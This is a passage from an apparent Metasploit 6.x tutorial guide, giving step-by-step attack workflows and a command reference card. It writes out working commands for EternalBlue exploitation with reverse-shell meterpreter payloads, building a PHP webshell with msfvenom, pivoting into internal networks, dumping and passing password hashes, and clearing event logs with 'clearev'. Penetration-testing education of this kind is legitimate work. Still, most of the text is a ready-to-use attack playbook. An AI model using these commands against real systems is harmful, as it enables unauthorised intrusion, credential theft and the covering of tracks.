msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_ms17_010) > run

# 4. Exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > exploit

# 5. Post-exploitation
meterpreter > getsystem
meterpreter > hashdump
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Workflow 2 — Web Application Attack

```
# 1. Discover web service
msf6 > use auxiliary/scanner/http/http_version
msf6 > set RHOSTS 192.168.1.80

# 2. Directory enumeration
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 > set DICTIONARY /usr/share/dirb/wordlists/common.txt

# 3. Upload and execute webshell
# (After finding file upload or RFI vulnerability)
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# 4. Set up handler
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD php/meterpreter_reverse_tcp
msf6 > set LHOST 192.168.1.10
msf6 > exploit -j

# 5. Trigger the shell (curl, browser, etc.)
# curl http://192.168.1.80/uploads/shell.php
```

### Workflow 3 — Pivoting Through a Compromised Host

```
# 1. Gain foothold on DMZ host (192.168.1.50)
# 2. Discover internal network
meterpreter > ipconfig
meterpreter > run post/multi/manage/autoroute

# 3. Add route for internal network
msf6 > route add 10.10.10.0/24 1

# 4. Set up SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j

# 5. Scan internal network through the pivot
# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
# Then: proxychains nmap -sT 10.10.10.0/24

# 6. Exploit internal targets
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.20
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit
```

### Workflow 4 — Credential Attacks

```
# 1. Extract hashes from compromised host
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# 2. Pass-the-hash to other systems
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 192.168.1.55
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(psexec) > exploit

# 3. Crack hashes offline with Hashcat
# hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 18. Tips, Tricks & Best Practices

### Performance

```
# Increase thread count for scanners
set THREADS 50

# Run modules as background jobs
exploit -j

# View running jobs
msf6 > jobs

# Kill a job
msf6 > jobs -k 0
```

### Useful Shortcuts

```
# Tab completion works everywhere
msf6 > use exploit/win<TAB>

# Previous command history
Ctrl+R   # Reverse search through history
Up/Down  # Cycle through history

# Send to background
Ctrl+Z   # Background current session

# Recall the last used module
msf6 > previous
```

### Session Tricks

```
# Upgrade a plain shell to Meterpreter
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 > set SESSION 1
msf6 > run

# Run a module on ALL sessions
msf6 > use post/windows/gather/hashdump
msf6 > set SESSION -1    # -1 = all sessions
msf6 > run

# List sessions in the background and rename them
msf6 > sessions -n webserver -i 1    # Rename session 1 to 'webserver'
```

### Logging

```
# Log all msfconsole output to a file
msf6 > spool /tmp/pentest_log.txt

# Stop logging
msf6 > spool off
```

### Common Environment Variables

```
# Store common LHOST/LPORT globally so you don't need to set them per module
msf6 > setg LHOST 192.168.1.10
msf6 > setg LPORT 4444
msf6 > setg RHOSTS 192.168.1.0/24

# Save global settings for future sessions
msf6 > save
```

### Module Search Tips

```
# Search by multiple criteria
msf6 > search type:exploit platform:linux rank:excellent

# Show only exploit modules with disclosure dates
msf6 > search type:exploit cve:2023

# Sort search results
msf6 > search ms17_010 rank:excellent
```

### Verbose Output

```
# Increase verbosity for debugging
msf6 > set VERBOSE true
msf6 > set DEBUG 1
```

### Working with Multiple Targets (RHOSTS)

```
# Set multiple individual hosts
set RHOSTS 192.168.1.10 192.168.1.20 192.168.1.30

# Set a CIDR range
set RHOSTS 192.168.1.0/24

# Set from a file
set RHOSTS file:/tmp/targets.txt

# Use database hosts as RHOSTS
set RHOSTS db_hosts    # Automatically use all hosts in DB
```

---

## Quick Reference Card

### Most Used Commands

|Task|Command|
|---|---|
|Search for module|`search <keyword>`|
|Load a module|`use <path>`|
|Show options|`show options`|
|Set an option|`set <OPTION> <value>`|
|Set globally|`setg <OPTION> <value>`|
|Run exploit|`exploit` or `run`|
|Run as background job|`exploit -j`|
|List sessions|`sessions`|
|Interact with session|`sessions -i <id>`|
|Background session|`background` or `Ctrl+Z`|
|Escalate privileges|`getsystem`|
|Dump hashes|`hashdump`|
|Take screenshot|`screenshot`|
|Upload file|`upload <src> <dst>`|
|Download file|`download <src> <dst>`|
|Add route/pivot|`route add <cidr> <session_id>`|
|Show jobs|`jobs`|
|Kill job|`jobs -k <id>`|
|Clear event logs|`clearev`|

### Useful File Locations

|Path|Description|
|---|---|
|`/usr/share/metasploit-framework/modules/`|All built-in modules|
|`~/.msf4/modules/`|Custom/user modules|
|`~/.msf4/logs/`|Log files|
|`~/.msf4/history`|Command history|
|`/usr/share/metasploit-framework/data/wordlists/`|Built-in wordlists|

---

_Guide covers Metasploit Framework 6.x. Module paths and option names may vary slightly between versions._